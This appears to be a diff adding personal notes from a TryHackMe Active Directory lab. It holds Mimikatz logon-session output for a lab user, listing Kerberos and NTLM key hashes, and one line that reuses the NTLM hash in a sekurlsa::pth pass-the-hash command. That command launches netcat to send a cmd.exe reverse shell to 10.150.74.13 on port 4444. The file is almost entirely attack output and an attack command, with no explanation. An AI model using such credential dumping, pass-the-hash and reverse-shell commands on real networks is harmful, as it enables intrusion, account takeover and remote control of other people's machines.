@@ -1,0 +1,22 @@
+Authentication Id : 0 ; 995292 (00000000:000f2fdc)                                                                                                           
+Session           : RemoteInteractive from 6                                                                                                                 
+User Name         : t1_toby.beck3                                                                                                                            
+Domain            : ZA                                                                                                                                       
+Logon Server      : THMDC                                                                                                                                    
+Logon Time        : 4/5/2026 1:32:05 PM                                                                                                                      
+SID               : S-1-5-21-3330634377-1326264276-632209373-4618                                                                                            
+                                                                                                                                                             
+         * Username : t1_toby.beck3                                                                                                                          
+         * Domain   : ZA.TRYHACKME.COM                                                                                                                       
+         * Password : (null)                                                                                                                                 
+         * Key List :                                                                                                                                        
+           aes256_hmac       2a59e02d204504015ed04fd1ff2dfef91d909dc13c13f0080a7f2a5cd2ddeb3f                                                                
+           rc4_hmac_nt       533f1bd576caa912bdb9da284bbc60fe                                                                                                
+           rc4_hmac_old      533f1bd576caa912bdb9da284bbc60fe                                                                                                
+           rc4_md4           533f1bd576caa912bdb9da284bbc60fe                                                                                                
+           rc4_hmac_nt_exp   533f1bd576caa912bdb9da284bbc60fe                                                                                                
+           rc4_hmac_old_exp  533f1bd576caa912bdb9da284bbc60fe  
+
+
+533f1bd576caa912bdb9da284bbc60fe
+sekurlsa::pth /user:toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912bdb9da284bbc60fe /run:"c:\tools\nc64.exe -e cmd.exe 10.150.74.13 4444"
